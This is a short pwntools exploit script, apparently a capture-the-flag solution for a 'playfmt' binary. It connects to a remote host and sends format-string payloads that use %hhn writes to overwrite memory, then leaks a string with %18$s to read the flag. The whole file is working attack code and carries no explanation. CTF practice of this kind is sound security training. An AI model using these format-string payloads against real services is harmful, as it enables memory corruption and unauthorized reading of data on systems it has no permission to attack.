from pwn import *
context.log_level = 'debug'
p=remote("120.78.192.35", 9999)
#p = process('./playfmt')
p.recv()
p.sendline("%72c%6$hhn")
p.recv()
p.sendline("%16c%14$hhn")
p.recv()
p.sendline("%18$s")
flags = p.recv()
print flags
p.close()

